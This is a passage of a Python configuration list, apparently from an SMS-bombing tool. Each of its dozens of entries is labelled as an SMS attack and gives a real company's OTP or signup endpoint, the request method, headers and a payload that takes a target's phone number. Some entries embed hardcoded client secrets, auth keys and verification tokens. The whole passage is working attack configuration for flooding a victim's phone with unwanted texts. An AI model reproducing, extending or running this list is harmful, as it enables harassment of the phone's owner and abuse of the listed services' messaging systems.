            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.delitime.ru/api/v2/signup',
            'headers': {

            },
            'data': {
                'SignupForm[username]': 'username()',
                'SignupForm[device_type]': '3'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
            'headers': {

            },
            'data': {
                'msisdn': number,
                'locale': 'en',
                'k': 'ic1rtwz1s1Hj1O0r',
                'r': '45559'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
            'headers': {

            },
            'data': {
                'phone': number,
                'device': 'Windows+v.43+Chrome+v.7453451',
                'app_version': '870'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
            'headers': {
                'Referer': 'https://indialends.com/personal-loan'
            },
            'data': {
                'aeyder03teaeare': '1',
                'ertysvfj74sje': '{cc}',
                'jfsdfu14hkgertd': number,
                'lj80gertdfg': '0'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://m.redbus.in/api/getOtp',
            'headers': {

            },
            'data': {
                'number': number,
                'cc': '{cc}',
                'whatsAppOpted': False
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://my.newtonschool.co:443/api/v1/user/otp/',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://mobile-api.qiwi.com/oauth/authorize',
            'headers': {

            },
            'data': {
                'response_type': 'urn:qiwi:oauth:response-type:confirmation-id',
                'username': 'username()',
                'client_id': 'android-qw',
                'client_secret': 'zAm4FKq9UnSe7id'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://securedapi.confirmtkt.com/api/platform/register',
            'headers': {

            },
            'data': {
                'newOtp': 'true',
                'mobileNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php',
            'headers': {

            },
            'data': {
                'mobile': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.frotels.com/appsendsms.php',
            'headers': {

            },
            'data': {
                'mobno': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.gapoon.com/userSignup',
            'headers': {

            },
            'data': {
                'mobile': number,
                'email': 'email()',
                'name': 'SpeedX'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://login.housing.com/api/v2/send-otp',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://porter.in/restservice/send_app_link_sms',
            'headers': {

            },
            'data': {
                'phone': number,
                'referrer_string': '',
                'brand': 'porter'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://cityflo.com/website-app-download-link-sms/',
            'headers': {

            },
            'data': {
                'mobile_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.nnnow.com/d/api/appDownloadLink',
            'headers': {

            },
            'data': {
                'mobileNumber': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://login.web.ajio.com/api/auth/signupSendOTP',
            'headers': {

            },
            'data': {
                'firstName': 'xxps',
                'login': 'wiqpdl223@wqew.com',
                'password': 'QASpw@1s',
                'genderType': 'Male',
                'mobileNumber': number,
                'requestType': 'SENDOTP'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://unacademy.com/api/v1/user/get_app_link/',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.treebo.com/api/v2/auth/login/otp/',
            'headers': {

            },
            'data': {
                'phone_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.airtel.in/referral-api/core/notify',
            'headers': {

            },
            'data': {
                'messageId': 'map',
                'rtn': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://pharmeasy.in/api/auth/requestOTP',
            'headers': {

            },
            'data': {

            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.mylescars.com/usermanagements/chkContact',
            'headers': {

            },
            'data': {
                'contactNo': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://grofers.com/v2/accounts/',
            'headers': {
                'auth_key': '3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7'
            },
            'data': {
                'user_phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.dream11.com/sendsmslink',
            'headers': {

            },
            'data': {
                'siteId': '1',
                'mobileNum': number,
                'appType': 'androidfull'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://www.cashify.in/api/cu01/v1/app-link',
            'headers': {

            },
            'data': {
                'mn': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://commonfront.paytm.com/v4/api/sendsms',
            'headers': {

            },
            'data': {
                'phone': number,
                'guid': '2952fa812660c58dc160ca6c9894221d'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin',
            'headers': {
                'Referer': 'https://online.kfc.co.in/login',
                '__RequestVerificationToken': '-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01'
            },
            'data': {

            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
            'headers': {
                'Referer': 'https://indialends.com/personal-loan'
            },
            'data': {
                'aeyder03teaeare': '1',
                'ertysvfj74sje': '{cc}',
                'jfsdfu14hkgertd': number,
                'lj80gertdfg': '0'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
            'headers': {
                'X-user-agent': user_agent()[1],
                'Origin': 'https://www.flipkart.com',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': {
                'loginId': f'+{number}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://cloud.mail.ru//api/v2/notify/applink',
            'headers': {

            },
            'data': {
                'phone': number,
                'api': '2',
                'email': 'email()',
                'x-email': 'email()'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.gotinder.com/v2/auth/sms/send',
            'headers': {

            },
            'data': {
                'phone_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://youla.ru/web-api/auth/request_code',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
            'headers': {

            },
            'data': {
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.delitime.ru/api/v2/signup',
            'headers': {

            },
            'data': {
                'SignupForm[username]': 'username()',
                'SignupForm[device_type]': '3'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
            'headers': {

            },
            'data': {
                'msisdn': number,
                'locale': 'en',
                'k': 'ic1rtwz1s1Hj1O0r',
                'r': '45559'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6/',
            'headers': {

            },
            'data': {
                'phone': number,
                'device': 'Windows+v.43+Chrome+v.7453451',
                'app_version': '870'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://indialends.com/internal/a/mobile-verification_v2.ashx',
            'headers': {
                'Referer': 'https://indialends.com/personal-loan'
            },
            'data': {
                'aeyder03teaeare': '1',
                'ertysvfj74sje': '{cc}',
                'jfsdfu14hkgertd': number,
                'lj80gertdfg': '0'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'get',
            'url': 'https://m.redbus.in/api/getOtp',
            'headers': {

            },
            'data': {
                'number': number,
                'cc': '{cc}',
                'whatsAppOpted': False
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'newtonschools',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://my.newtonschool.co:443/api/v1/user/otp/',
            'headers': {

            },
            'data': {
                'phone': number
            }
        }
]